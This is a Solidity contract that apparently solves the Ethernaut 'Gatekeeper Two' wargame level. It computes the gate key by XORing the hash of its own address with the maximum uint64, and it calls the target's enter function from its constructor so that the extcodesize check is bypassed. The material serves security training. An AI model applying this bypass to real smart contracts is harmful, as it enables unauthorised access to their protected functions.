// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


contract HackGateKeeperTwo {

  constructor(address _address) public {
    //A^B=C, A^C=B, B is gatekey
    //Call is happening during contract construction, extcodesize(caller())==0
    
    bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^  uint64(0) - 1);
    _address.call( abi.encodeWithSignature('enter(bytes8)', _gateKey ));
  }

}
